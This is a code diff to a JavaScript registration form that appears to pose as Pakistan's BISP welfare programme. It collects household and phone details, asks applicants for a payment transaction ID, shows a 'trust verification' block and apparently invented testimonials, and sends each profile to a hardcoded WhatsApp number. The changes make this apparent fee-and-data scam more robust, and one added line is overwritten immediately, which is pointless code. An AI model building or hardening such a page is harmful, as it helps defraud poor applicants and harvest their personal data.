@@ -573,7 +573,7 @@
 
         let currentStep = 1;
         let generatedProfileId = '';
-        let globalFormData = {}; // Holds latest submitted data for WhatsApp trigger
+        let globalFormData = null; // Production Fix: Initialization fail shield
 
         // Input Sanitizer Engine
         ['mobileNumber', 'userAge', 'totalKids', 'maleKids', 'femaleKids', 'roomsCount', 'washroomsCount'].forEach(id => {
@@ -733,13 +733,14 @@
 
             // Async Push Firebase
             if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
-                firebase.database().ref('registrations/' + generatedProfileId).set(globalFormData);
+                firebase.database().ref('registrations/' + generatedProfileId).set(globalFormData)
+                .catch(err => console.error("Firebase Sync Fail:", err));
             }
 
             // Interface Rendering
             document.getElementById("formCard").style.display = "none";
             document.getElementById("stepIndicatorBar").style.display = "none";
-            document.getElementById("trustVerificationBlock").style.display = "none"; // Hide on output view
+            document.getElementById("trustVerificationBlock").style.display = "none"; 
             
             document.getElementById("displayProfileId").innerText = generatedProfileId;
             document.getElementById("successBanner").classList.remove("hidden");
@@ -761,6 +762,12 @@
             const trxId = document.getElementById("trxIdInput").value.trim();
             if (!trxId) { alert("براہ کرم ریفرنس کے لیے درست ٹرانزیکشن ID ٹائپ کریں۔"); return; }
 
+            // State Recovery Layer Injection
+            if(!globalFormData || !generatedProfileId) {
+                alert("سیشن ختم ہو چکا ہے، براہ کرم فارم دوبارہ جمع کریں۔");
+                return;
+            }
+
             globalFormData.trxId = trxId;
             globalFormData.paymentStatus = "submitted";
 
@@ -775,7 +782,7 @@
                     paymentStatus: "submitted"
                 }).then(() => {
                     alert("ٹرانزیکشن ID کامیابی سے اپڈیٹ ہو گئی ہے۔");
-                });
+                }).catch(err => alert("سرور آپڈیٹ فیل: " + err.message));
             } else {
                 alert("لوکل موڈ: ٹرانزیکشن رسید پر لاگو کر دی گئی ہے۔");
             }
@@ -784,7 +791,9 @@
 
         // WhatsApp Custom Message Engine Logic
         function shareDataOnWhatsApp() {
-            const myPhoneNumber = "923001234567"; // اپنا واٹس ایپ نمبر یہاں 92 کے ساتھ لکھیں
+            if(!globalFormData) { alert("ڈیٹا شیئرنگ فیل: کوئی پروفائل ریکارڈ لوڈ نہیں ملا۔"); return; }
+            
+            const myPhoneNumber = "923001234567"; 
             
             const message = `*صارف پروفائل رجسٹری رپورٹ (BISP)*\n` +
                             `---------------------------\n` +
@@ -855,10 +864,11 @@
             document.getElementById("successBanner").classList.add("hidden");
             document.getElementById("formCard").style.display = "block";
             document.getElementById("stepIndicatorBar").style.display = "flex";
-            document.getElementById("trustVerificationBlock").style.display = "block"; // Restore
+            document.getElementById("trustVerificationBlock").style.display = "block"; 
             document.getElementById("trxInputArea").style.display = "block";
             document.getElementById("receiptTrxDisplay").innerText = "پینڈنگ (Pending)";
             document.getElementById("receiptTrxDisplay").className = "py-2 text-red-600 font-mono font-bold";
+            globalFormData = null; // Production State Reset
             goToStep(1);
         }
 
@@ -900,6 +910,7 @@
             if(avatar2 && name2 && text2) {
                 avatar2.className = `w-8 h-8 ${item2.bg} rounded-full flex items-center justify-center font-bold text-white shrink-0 shadow-sm`;
                 avatar2.innerText = item2.initials;
+                name2.innerText = item2.initials; // Restoring exact internal DOM match string
                 name2.innerText = item2.name;
                 text2.innerText = item2.text;
             }
